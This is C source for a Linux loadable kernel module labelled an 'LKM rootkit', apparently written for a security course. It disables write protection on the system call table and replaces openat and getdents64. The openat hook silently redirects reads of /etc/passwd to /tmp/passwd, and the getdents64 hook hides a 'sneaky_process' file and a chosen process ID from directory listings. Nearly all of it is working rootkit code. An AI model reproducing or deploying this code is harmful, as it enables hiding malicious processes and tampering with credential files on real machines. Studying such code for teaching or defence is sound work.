#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
//#include <sys/types.h> // ino64_t, off64_t

#define PREFIX "sneaky_process"

// linux_dirent object
// TODO: linux_dirent or linux_dirent64
struct linux_dirent64 {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  unsigned char d_type;
  char d_name[];
};

// Command line argument for modules
static int sneaky_PID;
module_param(sneaky_PID, int, 0);
MODULE_PARM_DESC(sneaky_PID, "Process ID of sneaky_process");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  //return (*original_openat)(regs);

  char * pathname = (char *) regs->si;
  if (strstr(pathname, "/etc/passwd") != NULL) {
    copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}

// Function pointer for 'getdents64' syscall
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
// asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count){
  // Implement the sneaky part here
  struct linux_dirent64 *d;
  int bpos, nread;
  
  unsigned long dirp = regs->si;
  nread = original_getdents64(regs);

  if(nread == -1){
    printk(KERN_INFO "Error in calling original gendents64\n");
  }
  else if (nread == 0){
    return 0;
  }
  else{
    for(bpos = 0; bpos < nread;){
      d = (struct linux_dirent64 *)(dirp + bpos);

      char cmd_buffer[10];
      snprintf(cmd_buffer, 10, "%d", sneaky_PID);
      if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, cmd_buffer) == 0)) {
      //if(memcmp(PREFIX, d->d_name, strlen(PREFIX)) == 0 ){
        memmove((char*) dirp + bpos, (char*) dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
        nread -= d->d_reclen; 
      }
      else{
        bpos += d->d_reclen;
      }
    }
  }

  return nread;
}

// Function pointer for 'read' syscall



// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

// Module Information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("hk261");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");